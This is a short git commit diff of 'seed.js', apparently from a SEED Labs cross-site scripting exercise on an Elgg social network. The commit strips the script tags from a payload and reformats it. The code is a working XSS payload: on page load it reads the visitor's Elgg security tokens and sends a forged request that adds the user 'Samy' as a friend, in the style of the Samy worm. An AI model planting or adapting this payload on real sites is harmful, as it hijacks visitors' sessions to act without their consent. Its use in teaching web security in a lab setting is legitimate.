c21d12adf46177b2bee8362130f5c97234f00658
Oliver Greenwood <greenwood672.dev@gmail.com>
2025-05-23 16:28:48 +0100

    Update seed.js

--- public/seed.js
+++ public/seed.js
@@ -1,13 +1,11 @@
-<script type="text/javascript">
- window.onload = function () {
+window.onload = function () {
  var Ajax=null;
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token; 
-//Construct the HTTP request to add Samy as a friend.
+ //Construct the HTTP request to add Samy as a friend.
  var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token; //FILL IN
  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
- }
-</script>
+}
